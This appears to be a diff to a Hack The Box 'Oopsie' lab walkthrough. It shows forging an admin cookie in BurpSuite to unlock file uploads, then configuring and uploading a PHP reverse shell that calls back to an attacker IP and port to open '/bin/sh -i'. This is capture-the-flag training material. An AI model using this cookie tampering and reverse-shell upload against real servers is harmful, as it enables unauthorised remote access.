@@ -94,3 +94,33 @@ Access ID | Name | Email
  
     $ crunch 3 3 1234567890 > wordlist1-100.txt
  ![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Oopsie/Screenshot_2021-07-31_11_32_47.png)
+ 
+ // We got super admin id - 865757
+ , Now we can edit the request in BurpSuite , just refresh upload page with BurpSuite and change the values in the request
+
+    Cookie: user=86575; role=superadmin
+
+// It worked !, Now we can upload files!
+// since we know(from the url) the server accepts php files lets try upload php reverse shell
+
+    $ cp /usr/share/laudanum/php/php-reverse-shell.php rshell.php
+// editing the file with our ip and port
+
+    ...
+    set_time_limit (0);
+    $VERSION = "1.0";
+    $ip = '10.10.16.7';  // CHANGE THIS
+    $port = 1444;       // CHANGE THIS
+    $chunk_size = 1400;
+    $write_a = null;
+    $error_a = null;
+    $shell = 'uname -a; w; id; /bin/sh -i';
+    $daemon = 0;
+    $debug = 0;
+    ...
+// Dont forget to edit Access id and role in BurpSuite again when upload the file , and the upload successfull
+
+    Repair Management System
+
+    The file rshell.php has been uploaded.
+
